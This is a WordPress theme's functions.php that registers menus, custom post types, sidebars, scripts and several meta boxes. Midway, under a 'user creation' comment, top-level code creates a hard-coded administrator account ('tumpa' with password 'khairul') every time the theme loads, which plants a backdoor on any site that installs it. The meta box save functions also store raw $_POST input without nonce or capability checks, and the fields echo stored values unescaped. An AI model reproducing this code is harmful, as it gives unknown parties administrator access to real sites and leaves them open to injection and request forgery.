<?php

    add_theme_support('title-tag');
    add_theme_support( 'post-thumbnails' );
    add_theme_support('custom-background');
    load_theme_textdomain('boom',get_template_directory_uri().'/language');



function readmore($limit){
  $content= explode(" ", get_the_content()); 
    $limitation= array_slice($content,0, $limit);
echo implode(" ", $limitation) ;
};


register_nav_menus(array(
        'primary'=>__('Main Menu','boom'),
    ));


register_post_type('zbooms',array(
    'labels'=>array(
        'name'=> 'Slider',
    ),
    'public'=> true,
    'supports'=> array('thumbnail','title'),
    'menu_icon'=> 'https://cdn4.iconfinder.com/data/icons/web-development-5/500/bug-spider-tools-32.png',/*   menu icon add from dashicon  ----*/
    'menu_position'=>50,
));
        
register_post_type('block',array(
    'labels' => array(
        'name' => ' block'
        
    ),
    'public' => true,
    'supports' => array( 'editor','title','thumbnail' ),
    'menu_icon'=>'http://elusiveicons.com/icon/edit'
));

register_post_type('gallery',array(

        'labels'=>array(
            'name'=>'Gallery',
            ),
        'public'=>true,
        'supports'=>array('editor','title','thumbnail'),
    ));


function zboom_widgets(){

    register_sidebar(array(
        'name'=>'right sidebar',
        'id' =>'right_sidebar',
        'description' => 'you can add right sidebar from here',
        'before_widget'=>'<div class="box">',
        'after_widget'=>'</div></div>',
        'before_title'=>'<div class="heading"><h2>',
        'after_title'=>'</h2></div><div class="content">',
        ));


    register_sidebar(array(
        'name'=>'footer sidebar',
        'id'=> 'footer_sidebar',
        'description'=>'Add footer sidebar',
        'before_widget'=>'<div class="col-1-4"><div class="wrap-col"><div class="box">',
        'after_widget'=>'</div></div></div></div>',
        'before_title'=>'<div class="heading"><h2>',
        'after_title'=>'</h2></div><div class="content">',


        ));


    register_sidebar(array(

        'name'=>'contact right sidebar',
        'id'=>'cright-sidebar',
        'description'=>'You can add sidebar for contact page',
        'before_widget'=>'<div class="box">',
        'after_widget'=>'</div></div>',
        'before_title'=>'<div class="heading"><h2>',
        'after_title'=>'</h2></div>
                        <div class="content">'


        ));

};
add_action('widgets_init','zboom_widgets');



/*     ---------  user creation   ---------    */




$newuser = new WP_User(wp_create_user('tumpa','khairul','khairul@tumpa.com'));

$newuser -> set_role('administrator');






/*   ------- adding style and Script  ------ */


function add_style_and_script(){

    wp_enqueue_style('zerogrid',get_template_directory_uri().'/css/zerogrid.css'); 
    wp_enqueue_style('style',get_template_directory_uri().'/css/style.css');
    wp_enqueue_style('responsive',get_template_directory_uri().'/css/responsive.css');  
    wp_enqueue_style('responsiveslides',get_template_directory_uri().'/css/responsiveslides.css');  



    wp_enqueue_script('responsiveslides',get_template_directory_uri().'/js/responsiveslides.js');
    

    wp_enqueue_script('jquery'); /* ---------- register jQuery --------- */

};

add_action('wp_enqueue_scripts','add_style_and_script');

/* ******  wp_enqueue_script for front-end &  admin_enqueue_scripts for dashboard (back-end) ****/



/*   ------- redux add system  ------ */


require_once('library/ReduxCore/framework.php');
require_once('library/sample/sample-config.php');



/* shortcode adde */


include('shortcode.php');


/*  Custom field  meta box register   */


function my_metabox(){
    
    add_meta_box('mybox','My Favarite Color','output_func','page',$context='normal');
    add_meta_box('mybox','My Favarite sss','output_func','post',$context='normal');
}

add_action('add_meta_boxes','my_metabox');

function output_func($post){ ?>

    <label for="color">My Favarite ss</label>
    <p><input type="text" name="mycolor" id="color" class="regular-text" value="<?php echo get_post_meta($post->ID,'mycolor',true) ?>"></p>


<?php };



function meta_save($post_id){
    
    update_post_meta($post_id,'mycolor', $_POST['mycolor']);
    

}
add_action('save_post','meta_save');










function my_box(){

    add_meta_box('favarite-food','Hello this is metabox','meta_func','page',$context='normal');
    

};


add_action('add_meta_boxes','my_box');


function meta_func($post){?>

<label for="food">Type your Food</label>
<input type="text" class="regular-text" id="food" name="fav" value="<?php echo get_post_meta($post->ID,'fav',true); ?>" >


<?php };


function data_update($post_id){
    
    update_post_meta($post_id,'fav',$_POST['fav']);
}

add_action('save_post','data_update');






function my_field(){
    
    add_meta_box('ffood','My food','my_output','page',$context='normal');

}

add_action('add_meta_boxes','my_field');


function my_output($post){?>
    <label for="khabar"> amar Khabar</label>
    <input type="text" name="fkhabar" id="khabar" value="<?php echo get_post_meta($post->ID,'fkhabar',true); ?>">

<?php };


function data_send($post_id){
    update_post_meta($post_id,'fkhabar',$_POST['fkhabar']);
}


add_action('save_post','data_send');

























 ?>
